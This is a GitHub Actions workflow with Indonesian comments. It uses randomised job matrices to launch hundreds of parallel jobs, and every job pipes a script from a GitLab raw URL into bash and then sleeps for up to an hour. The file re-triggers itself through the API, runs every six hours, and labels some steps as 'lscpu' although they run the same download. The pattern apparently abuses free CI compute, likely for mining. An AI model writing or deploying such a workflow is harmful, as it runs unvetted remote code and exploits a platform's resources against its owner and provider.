name: spaces-spider-app

on:
  workflow_dispatch:
    inputs:
      loop_count:
        description: 'Berapa kali ulangi? (0 = tidak ulang)'
        required: false
        default: '3'            # 👈 default 5 kali pengulangan
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'      # 👈 setiap 6 jam (loop tidak aktif)

permissions: {}

jobs:
  # =============================================
  # 🔮 Generator: 5 job dengan matriks acak + loop_count
  # =============================================
  generate:
    runs-on: ubuntu-latest
    outputs:
      line_go: ${{ steps.gen.outputs.line_go }}
      line_flag: ${{ steps.gen.outputs.line_flag }}
      lucas_go: ${{ steps.gen.outputs.lucas_go }}
      lucas_flag: ${{ steps.gen.outputs.lucas_flag }}
      popay_go: ${{ steps.gen.outputs.popay_go }}
      popay_flag: ${{ steps.gen.outputs.popay_flag }}
      dandi_go: ${{ steps.gen.outputs.dandi_go }}
      dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
      alam_go: ${{ steps.gen.outputs.alam_go }}
      alam_flag: ${{ steps.gen.outputs.alam_flag }}
      loop_count: ${{ steps.gen.outputs.loop_count }}
    steps:
      - name: Generate random strings
        id: gen
        shell: python
        run: |
          import random, string, json, os

          def random_strings(n, min_len=3, max_len=5):
              res = set()
              while len(res) < n:
                  length = random.randint(min_len, max_len)
                  chars = string.ascii_letters + string.digits
                  s = ''.join(random.choice(chars) for _ in range(length))
                  res.add(s)
              return list(res)

          specs = {
              'line_go': 9, 'line_flag': 26,
              'lucas_go': 9, 'lucas_flag': 26,
              'popay_go': 9, 'popay_flag': 26,
              'dandi_go': 9, 'dandi_flag': 3,
              'alam_go': 9, 'alam_flag': 3
          }

          with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
              for name, count in specs.items():
                  vals = random_strings(count)
                  f.write(f"{name}={json.dumps(vals)}\n")
              # Baca loop_count dari input dispatch, default 0
              loop_count = "${{ github.event.inputs.loop_count || '0' }}"
              f.write(f"loop_count={loop_count}\n")

  # =============================================
  # 📦 Job line (234 job) – curl + sleep 4 menit
  # =============================================
  line:
    needs: generate
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      max-parallel: 50
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.line_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.line_flag) }}
    steps:
      - name: Jalankan perintah & tahan 4 menit
        run: |
          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
          sleep 240s

  # =============================================
  # 🧊 Job lucas (234 job) – curl + sleep 15 menit
  # =============================================
  lucas:
    needs: [generate, line]
    runs-on: ubuntu-latest
    timeout-minutes: 25
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.lucas_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.lucas_flag) }}
    steps:
      - name: Jalankan perintah & tahan 15 menit
        run: |
          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
          sleep 18m

  # =============================================
  # 🍚 Job popay (234 job) – lscpu + sleep 35 menit
  # =============================================
  popay:
    needs: [generate, line]   # paralel dengan lucas
    runs-on: ubuntu-latest
    timeout-minutes: 45
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.popay_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.popay_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 35 menit
        run: |
          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
          sleep 35m

  # =============================================
  # 🍜 Job dandi (27 job) – curl + sleep 58 menit
  # =============================================
  dandi:
    needs: [generate, lucas]
    runs-on: ubuntu-latest
    timeout-minutes: 68
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.dandi_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
    steps:
      - name: Jalankan perintah & tahan 58 menit
        run: |
          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
          sleep 58m

  # =============================================
  # 🍚 Job alam (27 job) – lscpu + sleep 60 menit
  # =============================================
  alam:
    needs: [generate, popay]
    runs-on: ubuntu-latest
    timeout-minutes: 70
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.alam_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.alam_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 60 menit
        run: |
          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
          sleep 60m

  # =============================================
  # 🔁 Loop Trigger: Memulai Ulang Workflow
  # =============================================
  loop-trigger:
    name: Mulai ulang (jika loop > 0)
    needs: [generate, alam]
    if: needs.generate.outputs.loop_count > 0
    runs-on: ubuntu-latest
    permissions:
      actions: write
    steps:
      - name: Trigger workflow baru dengan loop_count berkurang
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          new_loop=$(( ${{ needs.generate.outputs.loop_count }} - 1 ))
          curl -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
            -d "{\"ref\":\"${{ github.ref_name }}\", \"inputs\":{\"loop_count\":\"$new_loop\"}}"
          echo "Loop tersisa: $new_loop (akan berhenti jika 0)"
      - name: Selesai – tidak ada loop lagi
        if: needs.generate.outputs.loop_count == '0'
        run: echo "Tidak ada pengulangan."